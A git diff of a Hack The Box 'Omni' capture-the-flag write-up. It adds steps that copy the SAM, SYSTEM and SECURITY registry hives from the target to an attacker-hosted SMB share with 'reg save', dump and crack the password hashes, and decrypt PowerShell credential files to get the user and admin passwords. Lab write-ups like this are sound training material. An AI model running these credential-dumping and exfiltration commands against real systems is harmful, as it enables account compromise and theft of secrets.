@@ -54,17 +54,33 @@ Typically, the user flag can be found easily in the Desktop of the user you gain
 Reading the contents of `C:\Data\Users\app\user.txt` leads to some Powershell credential information. Unfortunately, we can't decrypt the flag inside yet because it belongs to the app user.  
 ![User File](../images/HTB-Omni/Foothold_User.png)  
 
-Eventually, our search for credentials results in a series of bat files being discovered.  
-`>> powershell -c get-childitem -path c:\ -filter *.bat -recurse -erroraction silentlycontinue -force`
-![Bat Files](../images/HTB-Omni/Foothold_RBat.png)  
+### Extracting SAM, SYSTEM, SECURITY files
+Although there is an alternative path on this box involving a batch file left behind during creation, we'll be looking at the intended solution dumping user hashes from the registry. The Security Account Manager (or SAM file) is a database containing all the password hashes for user accounts. The SYSTEM and SECURITY files will allow us to extract the hashes for cracking.
 
-Contents of r.bat:  
-`>> type "c:\Program Files\WindowsPowershell\Modules\PackageManagement\r.bat"`  
-![R Bat](../images/HTB-Omni/Foothold_RBat_Text.png)  
+We'll start off by configuring an SMB Share on our local machine to tansfer the files to.  
+`>> sudo smbserver.py share . -smb2support -username omni -password omni`
 
-Looks like we've got credentials for both the app user and administrator!
-`app:mesh5143`  
-`administrator:_1nt3rn37ofTh1nGz`
+With the share running, we can connect to it from the Omni shell using the credentials we set up.  
+`>> net use \\10.10.14.15\share /u:omni omni`
+
+And now, we're able to extract the files while sending them to our machine:  
+`>> reg save HKLM\sam \\10.10.14.15\share\SAM`  
+`>> reg save HKLM\system \\10.10.14.15\share\SYSTEM`  
+`>> reg save HKLM\security \\10.10.14.15\share\SECURITY`  
+![SMB Share](../images/HTB-Omni/SMB_Share.png)
+
+### Extracting Hashes
+With the files we need successfully sent to our local machine, we're able to extract the hashes inside using `secretsdump.py`.  
+`>> secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL`  
+![Hashes](../images/HTB-Omni/Hashes.png)
+
+### Cracking Hashes
+Our last step to getting user credentials is to run the hashes through `hashcat` and see what we can find.  
+`>> .\hashcat.exe -a0 -m1000 .\hash.txt .\rockyou.txt --username`  
+![Hashes Cracked](../images/HTB-Omni/Hashes_Cracked.png)
+
+Looks like we've got credentials for the app user!
+`app:mesh5143`
 
 ### User Flag
 Authenticating with the app user credentials against port 8080 results in access to the Windows Device Portal we previously discovered. Under `Processes > Run Command`, we're able to execute arbitrary commands on the system. Let's get the User flag  
@@ -72,9 +88,10 @@ Authenticating with the app user credentials against port 8080 results in access
 ![User Flag](../images/HTB-Omni/User_Flag.png)  
 
 ## Privilege Escalation
+In addition to the user flag file, the app user's directory contains an `iot_admin.xml` file. Executing the previous command against the new file results in gaining the admin password `_1nt3rn37ofTh1nGz`.
+
 Reauthenticating to the dashboard using the administrative credentials, we're shown an identical screen as the app user. Again, navigating to `Processes > Run Command` will allow us to execute system commands, this time as the admin. 
 
 ### Root Flag
-After looking through the rest of the `C:\Data\Users\` directory, we find another powershell credentials file under `C:\Data\Users\administrator\root.txt`.  
 `>> powershell -c $credential = Import-CliXml -Path C:\Data\Users\administrator\root.txt;$credential.GetNetworkCredential().Password`  
 ![Root Flag](../images/HTB-Omni/Root_Flag.png)  
